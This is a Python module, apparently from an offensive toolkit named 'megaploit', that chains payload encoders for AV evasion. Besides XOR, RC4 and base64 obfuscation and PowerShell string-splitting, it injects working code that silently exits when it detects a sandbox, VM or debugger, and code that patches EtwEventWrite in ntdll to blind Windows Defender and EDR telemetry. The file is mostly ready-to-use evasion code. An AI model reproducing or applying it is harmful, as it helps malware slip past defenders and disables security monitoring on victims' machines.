"""
megaploit.payload.encoders
~~~~~~~~~~~~~~~~~~~~~~~~~~
Payload encoder pipeline for evasion and obfuscation.

Available encoders
------------------
  xor_rolling    — XOR with a rolling 32-byte key derived from HMAC
  rc4            — RC4 stream cipher with a random key prepended
  b64gzip        — gzip compress then base64 encode
  rev            — simple byte-reverse (defeats naive signature matching)
  zlib_b64       — zlib compress then base64 encode
  rot13_src      — ROT-13 string literals within the payload source
  null_pad       — insert null bytes between every byte (harmless padding)
  comment_spam   — insert random inline comments (Python/PS1-aware)
  varname_rand   — randomise Python variable names (light obfuscation)
  ps1_concat     — PowerShell string concatenation obfuscation

Encoder pipeline
----------------
Each encoder receives ``bytes`` and returns ``bytes``.
``encode_pipeline(data, names)`` chains them left-to-right.

When used by the payload builder the output is still valid Python/PS1/sh —
encoders that mutate source code (``varname_rand``, ``comment_spam``) only
make sense when applied to text payloads (Python / PowerShell sources).
"""

from __future__ import annotations

import base64
import gzip
import hashlib
import hmac
import os
import random
import re
import string
import struct
import zlib
from typing import Callable

__all__ = [
    "encode_pipeline",
    "ENCODERS",
    "EncoderError",
]


class EncoderError(Exception):
    """Raised when an encoder cannot process the payload."""


# ---------------------------------------------------------------------------
# Type alias
# ---------------------------------------------------------------------------

_EncoderFn = Callable[[bytes], bytes]


# ---------------------------------------------------------------------------
# Encoder implementations
# ---------------------------------------------------------------------------

def _xor_rolling(data: bytes) -> bytes:
    """XOR encode with a rolling 32-byte key.  Key prepended to output."""
    key = os.urandom(32)
    out = bytearray(len(data))
    for i, b in enumerate(data):
        out[i] = b ^ key[i % 32]
    # Pack as: 4-byte length of key | key | encrypted data
    return struct.pack(">I", len(key)) + key + bytes(out)


def _rc4(data: bytes) -> bytes:
    """RC4 stream cipher. Random 16-byte key prepended to output."""
    key = os.urandom(16)
    # KSA
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    # PRGA
    i = j = 0
    out = bytearray(len(data))
    for n, byte in enumerate(data):
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        out[n] = byte ^ S[(S[i] + S[j]) % 256]
    return key + bytes(out)


def _b64gzip(data: bytes) -> bytes:
    """Gzip compress then base64-encode."""
    compressed = gzip.compress(data, compresslevel=9)
    return base64.b64encode(compressed)


def _rev(data: bytes) -> bytes:
    """Reverse the byte sequence."""
    return data[::-1]


def _zlib_b64(data: bytes) -> bytes:
    """Zlib compress then base64-encode."""
    return base64.b64encode(zlib.compress(data, level=9))


def _rot13_src(data: bytes) -> bytes:
    """Apply ROT-13 to printable ASCII chars within the source bytes."""
    out = bytearray()
    for b in data:
        c = chr(b)
        if "a" <= c <= "z":
            out.append(ord("a") + (b - ord("a") + 13) % 26)
        elif "A" <= c <= "Z":
            out.append(ord("A") + (b - ord("A") + 13) % 26)
        else:
            out.append(b)
    return bytes(out)


def _null_pad(data: bytes) -> bytes:
    """Insert a null byte after every real byte (doubles size)."""
    out = bytearray(len(data) * 2)
    for i, b in enumerate(data):
        out[i * 2]     = b
        out[i * 2 + 1] = 0
    return bytes(out)


def _comment_spam(data: bytes) -> bytes:
    """
    Insert random Python/PS1 inline comments into source code.

    Operates on text: inserts ``# <random>`` comments at end of lines.
    Skips blank lines and lines that are already comments.
    """
    try:
        src = data.decode("utf-8")
    except UnicodeDecodeError:
        return data  # binary — skip

    _rand_comment = lambda: (
        "# " + "".join(random.choices(string.ascii_letters + string.digits, k=random.randint(6, 18)))
    )

    lines = src.splitlines()
    out   = []
    for line in lines:
        stripped = line.rstrip()
        if stripped and not stripped.lstrip().startswith("#"):
            if random.random() < 0.4:
                out.append(stripped + "  " + _rand_comment())
                continue
        out.append(line)
    return "\n".join(out).encode()


def _varname_rand(data: bytes) -> bytes:
    """
    Lightly randomise Python variable names.

    Renames single-char and two-char lowercase locals that appear at least
    twice to a random 8-char identifier — avoids touching keywords and
    built-ins.
    """
    _BUILTINS = frozenset(
        "True False None print len range list dict set str int float type "
        "bytes open os sys re json time threading subprocess socket".split()
    )
    try:
        src = data.decode("utf-8")
    except UnicodeDecodeError:
        return data

    # Find candidate short names that appear multiple times
    candidates = re.findall(r'\b([a-z_][a-z0-9_]{0,2})\b', src)
    from collections import Counter
    counts = Counter(candidates)
    remap = {}
    for name, cnt in counts.items():
        if cnt >= 2 and name not in _BUILTINS and len(name) <= 3:
            remap[name] = "_" + "".join(random.choices(string.ascii_lowercase, k=7))

    for old, new in remap.items():
        src = re.sub(rf'\b{re.escape(old)}\b', new, src)

    return src.encode()


def _ps1_concat(data: bytes) -> bytes:
    """
    Obfuscate PowerShell string literals via character concatenation.

    Splits each double-quoted string into ``"a" + "b" + ...`` fragments.
    Only modifies text payloads.
    """
    try:
        src = data.decode("utf-8")
    except UnicodeDecodeError:
        return data

    def _split_str(m: re.Match) -> str:
        inner = m.group(1)
        if not inner:
            return m.group(0)
        # Split into 3-char chunks
        chunks = [inner[i:i+3] for i in range(0, len(inner), 3)]
        return "(" + " + ".join(f'"{c}"' for c in chunks) + ")"

    result = re.sub(r'"([^"]{4,})"', _split_str, src)
    return result.encode()


def _sandbox_detect(data: bytes) -> bytes:
    """
    Prepend Python sandbox/VM detection to a Python source payload.

    Checks performed at agent startup (exits silently on detection):
      - Fewer than 2 logical CPU cores (sandbox indicator)
      - Total disk size < 60 GB on the boot drive
      - System uptime < 8 minutes (fresh VM spin-up)
      - Known sandbox/VM hostname prefixes (DESKTOP-, WIN-, SANDBOX, CUCKOO, VBOX, VMWARE, ANALYSIS)
      - IsDebuggerPresent() via ctypes (Windows)
      - Mouse cursor has not moved in 30 seconds (no user interaction)

    Only modifies Python source text payloads; binary payloads are passed through.
    """
    try:
        src = data.decode("utf-8")
    except UnicodeDecodeError:
        return data  # binary — skip

    guard = '''\
import sys as _sys, os as _os, time as _t, ctypes as _ct, platform as _pl
def _sandbox_exit():
    # CPU core count
    try:
        import multiprocessing as _mp
        if _mp.cpu_count() < 2: _sys.exit(0)
    except Exception: pass
    # Disk size (Windows C: or Linux /)
    try:
        import shutil as _sh
        _root = "C:\\\\" if _sys.platform == "win32" else "/"
        _total = _sh.disk_usage(_root).total
        if _total < 60 * 1024**3: _sys.exit(0)
    except Exception: pass
    # System uptime < 8 minutes
    try:
        if _sys.platform == "win32":
            _up = _ct.windll.kernel32.GetTickCount64() / 1000
        else:
            with open("/proc/uptime") as _f: _up = float(_f.read().split()[0])
        if _up < 480: _sys.exit(0)
    except Exception: pass
    # Hostname sandbox keywords
    try:
        _hn = _pl.node().upper()
        for _k in ("SANDBOX","CUCKOO","VBOX","VMWARE","ANALYSIS","MALWARE","VIRUS"):
            if _k in _hn: _sys.exit(0)
    except Exception: pass
    # Debugger check (Windows)
    try:
        if _sys.platform == "win32" and _ct.windll.kernel32.IsDebuggerPresent():
            _sys.exit(0)
    except Exception: pass
    # Mouse has not moved — likely no user (Windows)
    try:
        if _sys.platform == "win32":
            class _P(_ct.Structure): _fields_ = [("x",_ct.c_long),("y",_ct.c_long)]
            _p1 = _P(); _ct.windll.user32.GetCursorPos(_ct.byref(_p1))
            _t.sleep(30)
            _p2 = _P(); _ct.windll.user32.GetCursorPos(_ct.byref(_p2))
            if _p1.x == _p2.x and _p1.y == _p2.y: _sys.exit(0)
    except Exception: pass
_sandbox_exit()
del _sandbox_exit
'''
    return (guard + src).encode()


def _etw_patch(data: bytes) -> bytes:
    """
    Prepend ETW (Event Tracing for Windows) patcher to a Python source payload.

    Patches ``EtwEventWrite`` in ntdll.dll to return immediately (0xC3 ret),
    preventing Windows Defender and EDR solutions from receiving telemetry
    events for script execution, .NET load, and WMI activity.

    Windows-only; the patch is silently skipped on Linux/macOS.
    Only modifies Python source text payloads; binary payloads are passed through.
    """
    try:
        src = data.decode("utf-8")
    except UnicodeDecodeError:
        return data

    patch = '''\
import sys as _sys, ctypes as _ct
def _patch_etw():
    if _sys.platform != "win32": return
    try:
        _k32  = _ct.windll.kernel32
        _nt   = _ct.windll.ntdll
        _addr = _ct.cast(
            _k32.GetProcAddress(_k32.LoadLibraryA(b"ntdll.dll"), b"EtwEventWrite"),
            _ct.c_void_p
        ).value
        if not _addr: return
        _old = _ct.c_ulong(0)
        _ct.windll.kernel32.VirtualProtect(
            _ct.c_void_p(_addr), _ct.c_size_t(8), 0x40, _ct.byref(_old)
        )
        _ct.cast(_addr, _ct.POINTER(_ct.c_ubyte))[0] = 0xC3  # RET
        _ct.windll.kernel32.VirtualProtect(
            _ct.c_void_p(_addr), _ct.c_size_t(8), _old, _ct.byref(_old)
        )
    except Exception: pass
_patch_etw()
del _patch_etw
'''
    return (patch + src).encode()


# ---------------------------------------------------------------------------
# Encoder registry
# ---------------------------------------------------------------------------

ENCODERS: dict[str, _EncoderFn] = {
    "xor_rolling":    _xor_rolling,
    "rc4":            _rc4,
    "b64gzip":        _b64gzip,
    "rev":            _rev,
    "zlib_b64":       _zlib_b64,
    "rot13_src":      _rot13_src,
    "null_pad":       _null_pad,
    "comment_spam":   _comment_spam,
    "varname_rand":   _varname_rand,
    "ps1_concat":     _ps1_concat,
    "sandbox_detect": _sandbox_detect,
    "etw_patch":      _etw_patch,
}


# ---------------------------------------------------------------------------
# Pipeline runner
# ---------------------------------------------------------------------------

def encode_pipeline(data: bytes, encoders: list[str]) -> bytes:
    """
    Apply a sequence of named encoders to *data*.

    Parameters
    ----------
    data     : raw payload bytes
    encoders : list of encoder names (see ``ENCODERS`` dict)

    Returns
    -------
    bytes — encoded payload

    Raises
    ------
    EncoderError  if an unknown encoder name is given
    """
    result = data
    for name in encoders:
        fn = ENCODERS.get(name)
        if fn is None:
            raise EncoderError(
                f"Unknown encoder: {name!r}  "
                f"(available: {', '.join(ENCODERS.keys())})"
            )
        result = fn(result)
    return result


def encoder_info() -> dict[str, str]:
    """Return a {name: docstring} map of all available encoders."""
    return {
        name: (fn.__doc__ or "").strip().splitlines()[0]
        for name, fn in ENCODERS.items()
    }
